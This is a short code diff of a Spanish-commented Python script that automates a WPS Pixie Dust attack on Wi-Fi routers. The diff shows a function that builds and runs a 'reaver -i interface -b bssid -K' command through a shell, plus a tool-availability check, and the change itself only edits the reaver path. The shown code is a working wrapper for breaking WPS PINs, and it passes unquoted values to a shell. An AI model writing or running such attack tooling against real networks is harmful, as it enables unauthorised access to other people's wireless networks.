@@ -57,7 +57,7 @@ def scan_wifi(interface):
 def perform_pixie_dust_attack(interface, bssid):
     """Realiza el ataque Pixie Dust usando reaver con la opción -K."""
     print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
-    reaver_path = "/data/data/com.termux/files/home/reaver-wps-fork-t6x/src/reaver"
+    reaver_path = "~/reaver-wps-fork-t6x/src/reaver"
     command = f"{reaver_path} -i {interface} -b {bssid} -K"
     print(f"Ejecutando reaver: {command}")
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -88,7 +88,7 @@ def perform_pixie_dust_attack(interface, bssid):
 
 def main():
     # Verificar la disponibilidad de las herramientas necesarias
-    tools = ["iw", "reaver"]
+    tools = ["iw", "~/reaver-wps-fork-t6x/src/reaver"]
     for tool in tools:
         if not check_tool_availability(tool):
             return
